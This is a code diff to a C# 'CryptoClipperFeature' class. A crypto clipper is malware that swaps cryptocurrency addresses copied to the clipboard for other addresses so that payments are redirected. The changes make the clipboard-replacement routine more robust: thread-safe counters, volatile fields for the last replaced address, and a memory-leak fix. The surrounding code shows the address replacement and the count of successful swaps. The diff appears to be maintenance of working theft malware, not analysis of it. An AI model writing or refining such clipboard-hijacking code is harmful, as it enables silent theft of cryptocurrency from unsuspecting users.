@@ -16,6 +16,7 @@ internal static class CryptoClipperFeature
     [DllImport("kernel32.dll")] private static extern nint GlobalLock(nint hMem);
     [DllImport("kernel32.dll")] private static extern bool GlobalUnlock(nint hMem);
     [DllImport("kernel32.dll")] private static extern nuint GlobalSize(nint hMem);
+    [DllImport("kernel32.dll")] private static extern nint GlobalFree(nint hMem);
 
     private const uint CF_UNICODETEXT = 13;
     private const uint GMEM_MOVEABLE  = 0x0002;
@@ -48,9 +49,9 @@ internal static class CryptoClipperFeature
     private static volatile bool    _enabled;
     private static ClipperConfig    _config    = new();
     private static int              _replaceCount;
-    private static string           _lastType  = "";
-    private static string           _lastOrig  = "";
-    private static string           _lastNew   = "";
+    private static volatile string  _lastType  = "";
+    private static volatile string  _lastOrig  = "";
+    private static volatile string  _lastNew   = "";
     private static string           _lastClip  = "";
     private static Thread?          _thread;
     private static volatile bool    _running;
@@ -61,7 +62,7 @@ internal static class CryptoClipperFeature
     // ── Public API ─────────────────────────────────────────────────────────
 
     internal static bool IsEnabled => _enabled;
-    internal static int  ReplaceCount => _replaceCount;
+    internal static int  ReplaceCount => Interlocked.CompareExchange(ref _replaceCount, 0, 0);
     internal static (string LastType, string LastOrig, string LastNew) LastHit =>
         (_lastType, _lastOrig, _lastNew);
 
@@ -125,7 +126,7 @@ internal static class CryptoClipperFeature
             if (WriteClipboard(newText))
             {
                 _lastClip = newText;
-                _replaceCount++;
+                Interlocked.Increment(ref _replaceCount);
                 _lastType = type;
                 _lastOrig = trimmed.Length > 80 ? trimmed[..80] + "…" : trimmed;
                 _lastNew  = replacement;
@@ -182,7 +183,7 @@ internal static class CryptoClipperFeature
             nint hMem = GlobalAlloc(GMEM_MOVEABLE, (nuint)byteCount);
             if (hMem == nint.Zero) return false;
             nint ptr = GlobalLock(hMem);
-            if (ptr == nint.Zero) return false;
+            if (ptr == nint.Zero) { GlobalFree(hMem); return false; }
             try { Marshal.Copy(text.ToCharArray(), 0, ptr, text.Length); Marshal.WriteInt16(ptr + text.Length * 2, 0); }
             finally { GlobalUnlock(hMem); }
             SetClipboardData(CF_UNICODETEXT, hMem);
